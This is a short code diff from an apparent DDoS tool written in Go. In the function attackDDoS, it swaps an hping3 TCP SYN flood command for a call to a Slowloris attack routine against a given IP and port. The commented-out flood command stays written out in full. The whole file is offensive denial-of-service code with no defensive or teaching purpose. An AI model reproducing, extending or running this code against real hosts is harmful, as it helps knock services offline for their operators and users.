@@ -3,10 +3,10 @@ package ddos
 import (
 	"encoding/json"
 	"fmt"
-	"log"
+	//"log"
 	"math/rand"
 	"net/http"
-	"os/exec"
+	//"os/exec"
 
 	//"strings"
 	"net"
@@ -99,12 +99,14 @@ func attackDDoS(ip string, port string) {
 		}
 		fmt.Println(string(out))*/
 	case 2:
-		fmt.Println("------------------------Starting TCP SYN Attack------------------------")
+		fmt.Println("------------------------Starting Slowloris Attack------------------------")
+		slowloris(ip + ":" + port)
+		/*fmt.Println("------------------------Starting TCP SYN Attack------------------------")
 		out, err := exec.Command("hping3", "--syn", ip, "-p", "9999", "--flood").Output()
 		if err != nil {
 			log.Fatal(err)
 		}
-		fmt.Println(string(out))
+		fmt.Println(string(out))*/
 	}
 
 }
